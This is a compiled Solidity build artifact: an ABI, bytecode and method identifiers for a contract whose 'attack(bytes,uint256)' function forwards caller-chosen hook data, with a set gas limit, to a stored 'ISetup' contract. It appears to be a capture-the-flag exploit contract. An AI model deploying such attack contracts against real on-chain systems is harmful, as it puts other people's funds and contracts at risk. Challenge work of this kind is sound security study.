{"abi":[{"type":"constructor","inputs":[{"name":"_setup","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[{"name":"hookData","type":"bytes","internalType":"bytes"},{"name":"gasLimit","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"setup","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract ISetup"}],"stateMutability":"view"}],"bytecode":{"object":"0x608034606f57601f61020438819003918201601f19168301916001600160401b03831184841017607357808492602094604052833981010312606f57516001600160a01b03811690819003606f575f80546001600160a01b03191691909117905560405161017c90816100888239f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe6080806040526004361015610012575f80fd5b5f905f3560e01c9081637ef5994b1461005d575063ba0bba4014610034575f80fd5b3461005a578060031936011261005a57546040516001600160a01b039091168152602090f35b80fd5b9050346101425760403660031901126101425760043567ffffffffffffffff811161014257366023820112156101425780600401359067ffffffffffffffff8211610142573660248383010111610142575f546001600160a01b0316803b1561014257835f60448286839760248398631132c86d60e21b855260206004860152828286015201848401378181018301849052601f01601f19168101030192602435f180156101375761010d575080f35b905067ffffffffffffffff811161012357604052005b634e487b7160e01b5f52604160045260245ffd5b6040513d5f823e3d90fd5b5f80fdfea2646970667358221220c50e3f5b509ebb00a5fd5660d3a89c59fa9a9f55c306bce4d165017b886249b364736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"attack(bytes,uint256)":"7ef5994b","setup()":"ba0bba40"},"id":0}